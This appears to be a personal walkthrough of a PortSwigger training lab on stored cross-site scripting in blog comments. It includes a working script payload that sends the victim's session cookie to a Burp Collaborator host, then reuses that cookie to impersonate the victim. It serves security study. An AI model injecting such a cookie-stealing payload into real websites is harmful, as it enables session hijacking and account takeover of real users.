This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

# Vuln assessment

Find the XSS injection point:

![[comment-body.png]]

The comment body is vulnerable.

Check the session cookie:

![[sess-cookie.png]]

It can be stolen from other users using a XSS vector.

# Exploitation

Craft an script that requests Burp collaborator containing the cookie value:

```Javascript
<script>
var a = new Image().src ="https://738kzsyp9mhw78ltblylb7d9c0ir6hu6.oastify.com?cc="+escape(document.cookie);
</script>
```

After injecting the payload check the collaborator tab:

![[Client-Side Vulnerabilities/XSS/Exploiting XSS/labs/Exploiting cross-site scripting to steal cookies/images/interaction.png]]


Finally replace the obtained cookie.